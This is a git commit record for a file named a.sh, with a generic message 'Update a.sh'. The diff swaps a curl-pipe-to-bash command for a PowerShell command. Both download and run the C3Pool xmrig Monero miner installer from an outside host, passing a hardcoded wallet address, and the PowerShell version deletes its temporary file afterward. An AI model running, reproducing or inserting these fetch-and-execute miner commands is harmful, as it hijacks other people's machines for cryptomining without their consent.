8d96712d6caa66c29b3617d715671c729b6da68b
Siefe <66122762+Siefe@users.noreply.github.com>
2021-08-28 23:50:44 +0800

    Update a.sh

--- a.sh
+++ a.sh
@@ -1,1 +1,1 @@
-curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 44JvmbjokYmfF3gzqLo3WTPxXkV5kF2V3bcyT5udU9ok12aDPVpfH46fXeWi5ZhSHxdyhqDLCJfEv37B6uYkog6TMLYJUs8
+powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.bat', $tempfile); & $tempfile 44JvmbjokYmfF3gzqLo3WTPxXkV5kF2V3bcyT5udU9ok12aDPVpfH46fXeWi5ZhSHxdyhqDLCJfEv37B6uYkog6TMLYJUs8; Remove-Item -Force $tempfile"
